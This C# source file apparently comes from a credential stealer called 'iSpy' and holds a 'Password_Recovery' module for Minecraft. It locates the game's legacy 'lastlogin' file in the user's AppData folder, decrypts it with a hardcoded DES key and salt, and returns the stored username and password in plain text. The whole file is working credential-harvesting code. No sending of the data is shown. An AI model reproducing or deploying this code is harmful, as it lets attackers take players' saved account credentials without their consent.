using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.IO;
using System.Security.Cryptography;
namespace iSpy.Password_Recovery
{
    public class Minecraft
    {
        private static readonly byte[] LastLoginSalt = new byte[] { 0x0c, 0x9d, 0x4a, 0xe4, 0x1e, 0x83, 0x15, 0xfc };
        private const string LastLoginPassword = "passwordfile";
        private static string GetMinecraftPath()
        {
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
        }
        private static string LastLoginFile
        {
            get
            {
                return Path.Combine(GetMinecraftPath(), "lastlogin");
            }
        }

        public static string Recover()
        {
            string loginData = string.Empty;
            string username = string.Empty;
            string password = string.Empty;
            if (!File.Exists(LastLoginFile))
                return string.Empty;
            LastLogin lastlogin = LastLogin.GetLastLogin(LastLoginFile);
            if (lastlogin != null)
            {
                username = lastlogin.Username;
                password = lastlogin.Password;
            }
            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
            {
                loginData += "[Minecraft]" + Environment.NewLine + "Username: " + username + Environment.NewLine + "Password: " + password + Environment.NewLine + Environment.NewLine;
            }
            return loginData;
        }
    }
    public class PKCSKeyGenerator
    {
        /// <summary>
        /// Key used in the encryption algorythm.
        /// </summary>
        private byte[] key = new byte[8];

        /// <summary>
        /// IV used in the encryption algorythm.
        /// </summary>
        private byte[] iv = new byte[8];

        /// <summary>
        /// DES Provider used in the encryption algorythm.
        /// </summary>
        private DESCryptoServiceProvider des = new DESCryptoServiceProvider();

        /// <summary>
        /// Initializes a new instance of the PKCSKeyGenerator class.
        /// </summary>
        public PKCSKeyGenerator()
        {
        }

        /// <summary>
        /// Initializes a new instance of the PKCSKeyGenerator class.
        /// </summary>
        /// <param name="keystring">This is the same as the "password" of the PBEWithMD5AndDES method.</param>
        /// <param name="salt">This is the salt used to provide extra security to the algorythim.</param>
        /// <param name="iterationsMd5">Fill out iterationsMd5 later.</param>
        /// <param name="segments">Fill out segments later.</param>
        public PKCSKeyGenerator(string keystring, byte[] salt, int iterationsMd5, int segments)
        {
            this.Generate(keystring, salt, iterationsMd5, segments);
        }

        /// <summary>
        /// Gets the asymetric Key used in the encryption algorythm.  Note that this is read only and is an empty byte array.
        /// </summary>
        public byte[] Key
        {
            get
            {
                return this.key;
            }
        }

        /// <summary>
        /// Gets the initialization vector used in in the encryption algorythm.  Note that this is read only and is an empty byte array.
        /// </summary>
        public byte[] IV
        {
            get
            {
                return this.iv;
            }
        }

        /// <summary>
        /// Gets an ICryptoTransform interface for encryption
        /// </summary>
        public ICryptoTransform Encryptor
        {
            get
            {
                return this.des.CreateEncryptor(this.key, this.iv);
            }
        }

        /// <summary>
        /// Gets an ICryptoTransform interface for decryption
        /// </summary>
        public ICryptoTransform Decryptor
        {
            get
            {
                return des.CreateDecryptor(key, iv);
            }
        }

        /// <summary>
        /// Returns the ICryptoTransform interface used to perform the encryption.
        /// </summary>
        /// <param name="keystring">This is the same as the "password" of the PBEWithMD5AndDES method.</param>
        /// <param name="salt">This is the salt used to provide extra security to the algorythim.</param>
        /// <param name="iterationsMd5">Fill out iterationsMd5 later.</param>
        /// <param name="segments">Fill out segments later.</param>
        /// <returns>ICryptoTransform interface used to perform the encryption.</returns>
        public ICryptoTransform Generate(string keystring, byte[] salt, int iterationsMd5, int segments)
        {
            // MD5 bytes
            int hashLength = 16;

            // to store contatenated Mi hashed results
            byte[] keyMaterial = new byte[hashLength * segments];

            // --- get secret password bytes ----
            byte[] passwordBytes;
            passwordBytes = Encoding.UTF8.GetBytes(keystring);

            // --- contatenate salt and pswd bytes into fixed data array ---
            byte[] data00 = new byte[passwordBytes.Length + salt.Length];

            // copy the pswd bytes
            Array.Copy(passwordBytes, data00, passwordBytes.Length);

            // concatenate the salt bytes
            Array.Copy(salt, 0, data00, passwordBytes.Length, salt.Length);

            // ---- do multi-hashing and contatenate results  D1, D2 ...  into keymaterial bytes ----
            MD5 md5 = new MD5CryptoServiceProvider();
            byte[] result = null;

            // fixed length initial hashtarget
            byte[] hashtarget = new byte[hashLength + data00.Length];

            for (int j = 0; j < segments; j++)
            {
                // ----  Now hash consecutively for iterationsMd5 times ------
                if (j == 0)
                {
                    // initialize
                    result = data00;
                }
                else
                {
                    Array.Copy(result, hashtarget, result.Length);
                    Array.Copy(data00, 0, hashtarget, result.Length, data00.Length);
                    result = hashtarget;
                }

                for (int i = 0; i < iterationsMd5; i++)
                {
                    result = md5.ComputeHash(result);
                }

                // contatenate to keymaterial
                Array.Copy(result, 0, keyMaterial, j * hashLength, result.Length);
            }

            Array.Copy(keyMaterial, 0, this.key, 0, 8);
            Array.Copy(keyMaterial, 8, this.iv, 0, 8);

            return this.Encryptor;
        }
    }
    public class LastLogin
    {
        private static readonly byte[] LastLoginSalt = new byte[] { 0x0c, 0x9d, 0x4a, 0xe4, 0x1e, 0x83, 0x15, 0xfc };
        private const string LastLoginPassword = "passwordfile";
        public static string GetMinecraftPath()
        {
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
        }
        public static string LastLoginFile
        {
            get
            {
                return Path.Combine(GetMinecraftPath(), "lastlogin");
            }
        }

        public static LastLogin GetLastLogin()
        {
            return GetLastLogin(LastLoginFile);
        }

        public static LastLogin GetLastLogin(string lastLoginFile)
        {
            try
            {
                byte[] encryptedLogin = File.ReadAllBytes(lastLoginFile);
                PKCSKeyGenerator crypto = new PKCSKeyGenerator(LastLoginPassword, LastLoginSalt, 5, 1);
                ICryptoTransform cryptoTransform = crypto.Decryptor;
                byte[] decrypted = cryptoTransform.TransformFinalBlock(encryptedLogin, 0, encryptedLogin.Length);
                short userLength = IPAddress.HostToNetworkOrder(BitConverter.ToInt16(decrypted, 0));

                byte[] user = new byte[userLength];
                byte[] password = new byte[decrypted.Length - 4 - userLength];
                for (int i = 0; i < userLength; i++)
                {
                    user[i] = decrypted[i + 2];
                }
                for (int i = 0; i < decrypted.Length - 4 - userLength; i++)
                {
                    password[i] = decrypted[4 + userLength + i];
                }
                LastLogin result = new LastLogin();
                result.Username = System.Text.Encoding.UTF8.GetString(user);
                result.Password = System.Text.Encoding.UTF8.GetString(password);
                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public string Username = string.Empty;
        public string Password = string.Empty;
    }
}
